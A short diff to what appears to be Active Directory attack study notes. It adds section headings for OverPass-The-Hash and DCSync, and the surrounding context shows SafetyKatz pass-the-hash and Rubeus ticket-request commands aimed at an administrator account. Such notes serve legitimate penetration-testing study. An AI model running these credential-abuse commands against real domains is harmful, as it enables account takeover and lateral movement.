@@ -483,7 +483,7 @@ $ SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /a
 
 - The above commands starts a PowerShell session with a logon type 9 (same as runas /netonly).
 
-
+## **Lateral Movement - OverPass-The-Hash**
 
 - Over Pass the hash (OPTH) generate tokens from hashes or keys.
 
@@ -503,5 +503,7 @@ $ Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createneton
 ```
 
 
+
+## **Lateral Movement - DCSync**
 
 
